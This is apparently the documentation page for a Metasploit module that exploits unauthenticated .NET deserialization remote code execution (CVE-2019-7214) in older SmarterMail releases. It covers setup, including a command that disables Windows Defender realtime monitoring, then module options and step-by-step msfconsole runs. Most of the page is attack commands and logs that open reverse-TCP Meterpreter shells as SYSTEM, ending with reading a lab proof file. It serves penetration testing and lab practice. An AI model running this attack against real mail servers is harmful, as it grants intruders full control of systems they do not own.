## Vulnerable Application

The vulnerability affects:

    * SmarterTools SmarterMail Version <= 16.3.6989.16341 (all legacy versions without a build number)
    * SmarterTools SmarterMail Build < 6985

### Description

This module exploits a vulnerability in the SmarterTools SmarterMail software for
version numbers <= 16.x or for build numbers < 6985. The vulnerable versions and builds
expose three .NET remoting endpoints on port 17001, namely `/Servers`, `/Mail` and `/Spool`.
For example, a typical installation of SmarterMail Build 6970 will have the `/Servers` endpoint
exposed to the public at `tcp://0.0.0.0:17001/Servers`, where serialized .NET commands can be sent
through a TCP socket connection.

The three endpoints perform deserialization of untrusted data (CVE-2019-7214), allowing an attacker
to send arbitrary commands to be deserialized and executed. This module exploits this vulnerability
to perform .NET deserialization attacks, allowing remote code execution for any unauthenticated user
under the context of the SYSTEM account. Successful exploitation results in full administrative
control of the target server under the `NT AUTHORITY\SYSTEM` account.

This vulnerability was patched in Build 6985, where the 17001 port is no longer publicly accessible,
although it can be accessible locally at `127.0.0.1:17001`. Hence, this would still allow for a
privilege escalation vector if the server is compromised as a low-privileged user.

### Setup

This module was tested on SmarterMail Build 6919, 6970 (with positive results),
Build 6985 (with negative results), and on Version 16.3.6989 (with positive results).

Legacy builds and versions of SmarterMail can be obtained by signing up to the
SmarterTools website to create a user account, and then navigating to the
[Legacy Builds](https://www.smartertools.com/account#/downloads) page, where `EXE`
and `MSI` files can be downloaded.

## Verification Steps

1. Sign up to the [SmarterTools website](https://www.smartertools.com/). Log in with your created account.
2. Download `EXE` legacy versions and builds from a dropdown menu at [Legacy Builds](https://www.smartertools.com/account#/downloads),
specifically SmarterMail 16.x, Build 6970 and Build 6985.
3. Install the executable file (e.g. `SmarterMail_6970.exe`) and follow the instructions provided.
If reinstalling a different version/build, simply choose `Use an existing site` when prompted
in `Site Configuration Type`, and select `SmarterMail` in the next option.
4. Verify that the login page can be accessed at `http://localhost:9998/interface/root#/login`.
Set Admin username and password to be `admin:admin` (or anything arbitrary) if prompted.
5. Disable realtime protection on an Administrative PowerShell session with
`Set-MpPreference -DisableRealtimeMonitoring $true`.
6. Start `msfconsole` and follow along with default options.
7. Do: `use exploit/windows/http/smartermail_rce`
8. Do: `set RHOSTS [SMARTERMAIL_SERVER_IP]`
9. Do: `set LHOST eth0`
10. Do: `exploit`

## Options

### TARGET (Required)

    0. Target 0 (default) - Windows Command uses a default PowerShell payload to execute
    code and open a Meterpreter session. However, any desired payload can be chosen. Choose with `set TARGET 0`.
    1. Target 1 - x86/x64 Windows CmdStager uses a CmdStager with default `vbs` stager flavor to execute code
    and open a Meterpreter session. Choose with `set TARGET 1`.

### ENDPOINT (Required)

Choose one of three exposed .NET remoting endpoints, either `Servers`, `Spool` or `Mail`.
The default is `Servers`, but any one of the three will do.

### RPORT (Required)

This is the port for the SmarterMail HTTP server, which is default on port 9998.
Although this port is not required for exploitation, it is required for checking the
vulnerability and version/build number of the SmarterMail software.

### TARGETURI (Required)

This is the base path of the SmarterMail HTTP server. The vulnerability check follows the
redirect from base path `/` to the login page at `/interface/root#/login`, but this option
is provided in case the login page is located at a different URI.

### TCP_PORT (Required)

This is the TCP port where the .NET remoting endpoints are located, and is required for
sending serialized data and Meterpreter payloads. The default port is 17001.

## Scenarios

### SmarterMail Build 6970 on Windows 10 Pro

* Using default TARGET 0 - Windows Command

```
msf6 > use exploit/windows/http/smartermail_rce 
[*] Using configured payload cmd/windows/powershell/meterpreter/reverse_tcp
msf6 exploit(windows/http/smartermail_rce) > set RHOSTS 192.168.29.1
RHOSTS => 192.168.29.1
msf6 exploit(windows/http/smartermail_rce) > set LHOST eth0
LHOST => 192.168.245.128
msf6 exploit(windows/http/smartermail_rce) > exploit

[*] Started reverse TCP handler on 192.168.245.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking target web server for a response...
[+] Target is running SmarterMail.
[*] Checking SmarterMail product build...
[+] Target is running SmarterMail Build 6970.
[+] The target appears to be vulnerable.
[*] Sending stage (175686 bytes) to 192.168.245.1
[*] Meterpreter session 1 opened (192.168.245.128:4444 -> 192.168.245.1:51164) at 2023-07-07 03:30:47 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-50BU5J8
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 
```

* Using TARGET 1 - x86/x64 Windows CmdStager:

```
msf6 > use exploit/windows/http/smartermail_rce
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/smartermail_rce) > set TARGET 1
TARGET => 1
msf6 exploit(windows/http/smartermail_rce) > set RHOSTS 192.168.29.1
RHOSTS => 192.168.29.1
msf6 exploit(windows/http/smartermail_rce) > set LHOST eth0
LHOST => eth0
msf6 exploit(windows/http/smartermail_rce) > exploit

[*] Started reverse TCP handler on 192.168.245.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking target web server for a response...
[+] Target is running SmarterMail.
[*] Checking SmarterMail product build...
[+] Target is running SmarterMail Build 6970.
[+] The target appears to be vulnerable.
[*] Command Stager progress -   2.01% done (2046/101881 bytes)
[*] Command Stager progress -   4.02% done (4092/101881 bytes)
[*] Command Stager progress -   6.02% done (6138/101881 bytes)
[*] Command Stager progress -   8.03% done (8184/101881 bytes)
[*] Command Stager progress -  10.04% done (10230/101881 bytes)
[*] Command Stager progress -  12.05% done (12276/101881 bytes)
[*] Command Stager progress -  14.06% done (14322/101881 bytes)
[*] Command Stager progress -  16.07% done (16368/101881 bytes)
[*] Command Stager progress -  18.07% done (18414/101881 bytes)
[*] Command Stager progress -  20.08% done (20460/101881 bytes)
[*] Command Stager progress -  22.09% done (22506/101881 bytes)
[*] Command Stager progress -  24.10% done (24552/101881 bytes)
[*] Command Stager progress -  26.11% done (26598/101881 bytes)
[*] Command Stager progress -  28.12% done (28644/101881 bytes)
[*] Command Stager progress -  30.12% done (30690/101881 bytes)
[*] Command Stager progress -  32.13% done (32736/101881 bytes)
[*] Command Stager progress -  34.14% done (34782/101881 bytes)
[*] Command Stager progress -  36.15% done (36828/101881 bytes)
[*] Command Stager progress -  38.16% done (38874/101881 bytes)
[*] Command Stager progress -  40.16% done (40920/101881 bytes)
[*] Command Stager progress -  42.17% done (42966/101881 bytes)
[*] Command Stager progress -  44.18% done (45012/101881 bytes)
[*] Command Stager progress -  46.19% done (47058/101881 bytes)
[*] Command Stager progress -  48.20% done (49104/101881 bytes)
[*] Command Stager progress -  50.21% done (51150/101881 bytes)
[*] Command Stager progress -  52.21% done (53196/101881 bytes)
[*] Command Stager progress -  54.22% done (55242/101881 bytes)
[*] Command Stager progress -  56.23% done (57288/101881 bytes)
[*] Command Stager progress -  58.24% done (59334/101881 bytes)
[*] Command Stager progress -  60.25% done (61380/101881 bytes)
[*] Command Stager progress -  62.25% done (63426/101881 bytes)
[*] Command Stager progress -  64.26% done (65472/101881 bytes)
[*] Command Stager progress -  66.27% done (67518/101881 bytes)
[*] Command Stager progress -  68.28% done (69564/101881 bytes)
[*] Command Stager progress -  70.29% done (71610/101881 bytes)
[*] Command Stager progress -  72.30% done (73656/101881 bytes)
[*] Command Stager progress -  74.30% done (75702/101881 bytes)
[*] Command Stager progress -  76.31% done (77748/101881 bytes)
[*] Command Stager progress -  78.32% done (79794/101881 bytes)
[*] Command Stager progress -  80.33% done (81840/101881 bytes)
[*] Command Stager progress -  82.34% done (83886/101881 bytes)
[*] Command Stager progress -  84.35% done (85932/101881 bytes)
[*] Command Stager progress -  86.35% done (87978/101881 bytes)
[*] Command Stager progress -  88.36% done (90024/101881 bytes)
[*] Command Stager progress -  90.37% done (92070/101881 bytes)
[*] Command Stager progress -  92.38% done (94116/101881 bytes)
[*] Command Stager progress -  94.39% done (96162/101881 bytes)
[*] Command Stager progress -  96.39% done (98208/101881 bytes)
[*] Command Stager progress -  98.40% done (100252/101881 bytes)
[*] Command Stager progress - 100.00% done (101881/101881 bytes)
[*] Sending stage (175686 bytes) to 192.168.245.1
[*] Meterpreter session 1 opened (192.168.245.128:4444 -> 192.168.245.1:55099) at 2023-07-06 05:43:26 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-50BU5J8
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 
```

### SmarterMail Version 16.3.6989 on Windows 10 Pro

* Using ENDPOINT `Mail`:

```
msf6 > use exploit/windows/http/smartermail_rce
[*] Using configured payload cmd/windows/powershell/meterpreter/reverse_tcp
msf6 exploit(windows/http/smartermail_rce) > set ENDPOINT Mail
ENDPOINT => Mail
msf6 exploit(windows/http/smartermail_rce) > set RHOSTS 192.168.29.1
RHOSTS => 192.168.29.1
msf6 exploit(windows/http/smartermail_rce) > set LHOST eth0
LHOST => eth0
msf6 exploit(windows/http/smartermail_rce) > exploit

[*] Started reverse TCP handler on 192.168.245.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking target web server for a response...
[+] Target is running SmarterMail.
[*] Checking SmarterMail product build...
[!] Product build not found. 16.x versions and below do not have a build number.
[*] Checking SmarterMail product version...
[+] Target is running SmarterMail Version 16.3.6989.
[+] The target appears to be vulnerable.
[*] Sending stage (175686 bytes) to 192.168.245.1
[*] Meterpreter session 1 opened (192.168.245.128:4444 -> 192.168.245.1:55147) at 2023-07-06 06:20:19 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-50BU5J8
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 
```

### SmarterMail Build 6985 on Windows 10 Pro

```
msf6 > use exploit/windows/http/smartermail_rce
[*] Using configured payload cmd/windows/powershell/meterpreter/reverse_tcp
msf6 exploit(windows/http/smartermail_rce) > set RHOSTS 192.168.29.1
RHOSTS => 192.168.29.1
msf6 exploit(windows/http/smartermail_rce) > set LHOST eth0
LHOST => eth0
msf6 exploit(windows/http/smartermail_rce) > exploit

[*] Started reverse TCP handler on 192.168.245.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking target web server for a response...
[+] Target is running SmarterMail.
[*] Checking SmarterMail product build...
[+] Target is running SmarterMail Build 6985.
[*] Checking SmarterMail product version...
[+] Target is running SmarterMail Version 100.0.6985.
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/http/smartermail_rce) > set ForceExploit true
ForceExploit => true
msf6 exploit(windows/http/smartermail_rce) > exploit

[*] Started reverse TCP handler on 192.168.245.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking target web server for a response...
[+] Target is running SmarterMail.
[*] Checking SmarterMail product build...
[+] Target is running SmarterMail Build 6985.
[*] Checking SmarterMail product version...
[+] Target is running SmarterMail Version 100.0.6985.
[!] The target is not exploitable. ForceExploit is enabled, proceeding with exploitation.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/http/smartermail_rce) > 
```

### SmarterMail Build 6919 on Windows 10 Pro (Algernon from Proving Grounds Practice)

```
msf6 > use exploit/windows/http/smartermail_rce
[*] Using configured payload cmd/windows/powershell/meterpreter/reverse_tcp
msf6 exploit(windows/http/smartermail_rce) > set RHOSTS 192.168.247.65
RHOSTS => 192.168.247.65
msf6 exploit(windows/http/smartermail_rce) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/http/smartermail_rce) > check

[*] Checking target web server for a response...
[+] Target is running SmarterMail.
[*] Checking SmarterMail product build...
[+] Target is running SmarterMail Build 6919.
[*] 192.168.247.65:9998 - The target appears to be vulnerable.
msf6 exploit(windows/http/smartermail_rce) > exploit

[*] Started reverse TCP handler on 192.168.45.188:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking target web server for a response...
[+] Target is running SmarterMail.
[*] Checking SmarterMail product build...
[+] Target is running SmarterMail Build 6919.
[+] The target appears to be vulnerable.
[*] Sending stage (175686 bytes) to 192.168.247.65
[*] Meterpreter session 1 opened (192.168.45.188:4444 -> 192.168.247.65:49710) at 2023-07-06 07:24:13 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : ALGERNON
OS              : Windows 10 (10.0 Build 18363).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter > shell
Process 4240 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18363.815]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
84b4****************************

C:\Users\Administrator\Desktop>
```
